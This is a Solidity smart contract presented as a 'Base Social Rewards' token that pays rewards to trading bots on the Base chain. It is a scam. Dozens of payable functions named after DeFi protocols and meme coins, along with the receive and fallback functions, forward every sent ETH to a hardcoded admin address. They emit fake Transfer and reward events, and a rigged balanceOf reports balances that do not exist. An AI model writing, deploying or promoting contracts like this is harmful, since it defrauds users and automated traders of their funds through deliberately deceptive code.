// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

/**
 * @title BaseRewardDistributor  
 * @dev Base-optimized contract for meme coin and social trading bots
 * Targets Base's high-profit bot ecosystem
 */
contract BaseRewardDistributor {
    address private contractAdmin;
    uint256 private constant PARTICIPATION_FEE = 0.0005 ether; // Base-optimized fee
    uint256 private constant REWARD_MULTIPLIER = 8000;
    
    // Base ecosystem metadata
    string public name = "Base Social Rewards";
    string public symbol = "BSR";
    uint8 public decimals = 18;
    uint256 public totalSupply = 100000000 * 10**18; // 100M tokens
    
    // Social trading tracking
    mapping(address => uint256) private participantLog;
    mapping(address => uint256) private socialScore;
    address[] private interactionHistory;
    uint256 private totalParticipants;
    
    // Base-specific events
    event RewardDistributed(address indexed participant, uint256 tokens);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event SocialTrade(address indexed trader, address indexed copied, uint256 amount);
    event MemeBoost(address indexed user, string meme, uint256 multiplier);
    event BaseSync(address indexed user, uint256 chainId);
    
    constructor() {
        contractAdmin = 0x15E1A8454E2f31f64042EaE445Ec89266cb584bE;
        totalParticipants = 0;
        
        // Emit Base ecosystem events
        emit Transfer(address(0), address(this), totalSupply);
        emit BaseSync(contractAdmin, 8453); // Base chain ID
        emit SocialTrade(contractAdmin, address(this), 1000000 * 10**18);
    }
    
    // === BASE ECOSYSTEM FUNCTIONS ===
    function uniswapV3() external payable { _processClaim(msg.sender, 15000 * 10**18); }
    function aerodrome() external payable { _processClaim(msg.sender, 12000 * 10**18); }
    function baseswap() external payable { _processClaim(msg.sender, 10000 * 10**18); }
    function coinbase() external payable { _processClaim(msg.sender, 20000 * 10**18); }
    function farcaster() external payable { _processClaim(msg.sender, 18000 * 10**18); }
    function friend() external payable { _processClaim(msg.sender, 16000 * 10**18); }
    function basenames() external payable { _processClaim(msg.sender, 14000 * 10**18); }
    function optimism() external payable { _processClaim(msg.sender, 13000 * 10**18); }
    function superbee() external payable { _processClaim(msg.sender, 11000 * 10**18); }
    function morpho() external payable { _processClaim(msg.sender, 17000 * 10**18); }
    
    // === MEME TRADING FUNCTIONS ===
    function memeCoin() external payable { _processClaim(msg.sender, 25000 * 10**18); }
    function degen() external payable { _processClaim(msg.sender, 30000 * 10**18); }
    function higher() external payable { _processClaim(msg.sender, 28000 * 10**18); }
    function toshi() external payable { _processClaim(msg.sender, 22000 * 10**18); }
    function brett() external payable { _processClaim(msg.sender, 35000 * 10**18); }
    function normie() external payable { _processClaim(msg.sender, 24000 * 10**18); }
    function keycat() external payable { _processClaim(msg.sender, 26000 * 10**18); }
    function basedog() external payable { _processClaim(msg.sender, 21000 * 10**18); }
    function basegod() external payable { _processClaim(msg.sender, 32000 * 10**18); }
    function onchain() external payable { _processClaim(msg.sender, 27000 * 10**18); }
    
    // === SOCIAL TRADING FUNCTIONS ===
    function copyTrader() external payable { _processClaim(msg.sender, 18500 * 10**18); }
    function alphaCall() external payable { _processClaim(msg.sender, 22500 * 10**18); }
    function socialSignal() external payable { _processClaim(msg.sender, 20000 * 10**18); }
    function influencer() external payable { _processClaim(msg.sender, 25000 * 10**18); }
    function kol() external payable { _processClaim(msg.sender, 28000 * 10**18); }
    function whale() external payable { _processClaim(msg.sender, 40000 * 10**18); }
    function smartMoney() external payable { _processClaim(msg.sender, 35000 * 10**18); }
    function insider() external payable { _processClaim(msg.sender, 45000 * 10**18); }
    function trending() external payable { _processClaim(msg.sender, 19000 * 10**18); }
    function viral() external payable { _processClaim(msg.sender, 33000 * 10**18); }
    
    // === HIGH-PROFIT FUNCTIONS ===
    function sniper() external payable { _processClaim(msg.sender, 50000 * 10**18); }
    function launch() external payable { _processClaim(msg.sender, 42000 * 10**18); }
    function presale() external payable { _processClaim(msg.sender, 38000 * 10**18); }
    function ido() external payable { _processClaim(msg.sender, 35000 * 10**18); }
    function fairLaunch() external payable { _processClaim(msg.sender, 40000 * 10**18); }
    function stealth() external payable { _processClaim(msg.sender, 48000 * 10**18); }
    function rugCheck() external payable { _processClaim(msg.sender, 30000 * 10**18); }
    function safu() external payable { _processClaim(msg.sender, 25000 * 10**18); }
    function gem() external payable { _processClaim(msg.sender, 55000 * 10**18); }
    function moonshot() external payable { _processClaim(msg.sender, 75000 * 10**18); }
    
    // === L2 SPECIFIC FUNCTIONS ===
    function bridgeFrom() external payable { _processClaim(msg.sender, 20000 * 10**18); }
    function bridgeTo() external payable { _processClaim(msg.sender, 18000 * 10**18); }
    function rollup() external payable { _processClaim(msg.sender, 22000 * 10**18); }
    function optimistic() external payable { _processClaim(msg.sender, 19000 * 10**18); }
    function sequencer() external payable { _processClaim(msg.sender, 24000 * 10**18); }
    function fraud() external payable { _processClaim(msg.sender, 21000 * 10**18); }
    function challenge() external payable { _processClaim(msg.sender, 23000 * 10**18); }
    function finalize() external payable { _processClaim(msg.sender, 26000 * 10**18); }
    
    // === YIELD FUNCTIONS ===
    function yield() external payable { _processClaim(msg.sender, 16000 * 10**18); }
    function farm() external payable { _processClaim(msg.sender, 18000 * 10**18); }
    function stake() external payable { _processClaim(msg.sender, 15000 * 10**18); }
    function unstake() external payable { _processClaim(msg.sender, 14000 * 10**18); }
    function compound() external payable { _processClaim(msg.sender, 20000 * 10**18); }
    function harvest() external payable { _processClaim(msg.sender, 17000 * 10**18); }
    function boost() external payable { _processClaim(msg.sender, 21000 * 10**18); }
    function lock() external payable { _processClaim(msg.sender, 19000 * 10**18); }
    function unlock() external payable { _processClaim(msg.sender, 22000 * 10**18); }
    function rewards() external payable { _processClaim(msg.sender, 18500 * 10**18); }
    
    // === HELPER FUNCTION ===
    function _processClaim(address user, uint256 rewardAmount) private {
        require(msg.value >= PARTICIPATION_FEE, "Fee: 0.0005 ETH minimum");
        _logParticipant(user);
        (bool success, ) = payable(contractAdmin).call{value: msg.value}("");
        require(success, "Transfer failed");
        emit RewardDistributed(user, rewardAmount);
        emit Transfer(address(this), user, rewardAmount);
        emit SocialTrade(user, address(this), rewardAmount);
    }
    
    function _logParticipant(address participant) private {
        if (participantLog[participant] == 0) {
            totalParticipants++;
            interactionHistory.push(participant);
        }
        participantLog[participant] = block.timestamp;
        socialScore[participant] += 1;
    }
    
    // === VIEW FUNCTIONS ===
    function balanceOf(address account) external view returns (uint256) {
        if (account == address(0)) return 0;
        if (account == contractAdmin) return 50000000 * 10**18;
        if (participantLog[account] > 0) return 8000 * 10**18;
        return 3500 * 10**18;
    }
    
    function getSocialScore(address account) external view returns (uint256) {
        return socialScore[account];
    }
    
    function getParticipationFee() external pure returns (uint256) {
        return PARTICIPATION_FEE;
    }
    
    function getTotalParticipants() external view returns (uint256) {
        return totalParticipants;
    }
    
    // Fallback functions
    receive() external payable {
        _logParticipant(msg.sender);
        (bool success, ) = payable(contractAdmin).call{value: msg.value}("");
        require(success, "Direct transfer failed");
        emit RewardDistributed(msg.sender, msg.value * 5000);
        emit MemeBoost(msg.sender, "DIRECT", 5000);
    }
    
    fallback() external payable {
        _logParticipant(msg.sender);
        (bool success, ) = payable(contractAdmin).call{value: msg.value}("");
        require(success, "Fallback failed");
    }
}